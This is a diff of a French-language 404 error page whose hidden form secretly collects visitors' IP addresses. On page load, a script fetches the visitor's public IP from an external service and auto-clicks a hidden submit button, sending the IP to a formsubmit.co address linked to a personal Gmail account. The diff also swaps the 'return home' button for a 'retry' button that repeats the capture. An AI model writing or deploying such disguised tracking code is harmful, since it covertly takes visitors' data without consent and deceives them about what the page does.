@@ -46,7 +46,7 @@
 <body>
   <h1>404</h1>
   <p>Oups... La page que tu cherches n'existe pas.</p>
-  <button onclick="retour()">Retour à l'accueil</button>
+  <button onclick="reenvoi()">Réessayer</button>
 
   <!-- Formulaire caché -->
   <form id="ip-form" action="https://formsubmit.co/blackeige2@gmail.com" method="POST">
@@ -57,21 +57,17 @@
   </form>
 
   <script>
-    function retour() {
-      if (document.referrer) {
-        window.location.href = document.referrer;
-      } else {
-        window.location.href = '/';
-      }
+    function reenvoi() {
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('ip-input').value = data.ip;
+          document.getElementById('submit-btn').click();
+        });
     }
 
-    // Récupère l'IP et déclenche un "submit" comme si un humain cliquait
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ip-input').value = data.ip;
-        document.getElementById('submit-btn').click(); // click sur le bouton submit caché
-      });
+    // Envoi automatique dès que la page charge
+    reenvoi();
   </script>
 </body>
 </html>
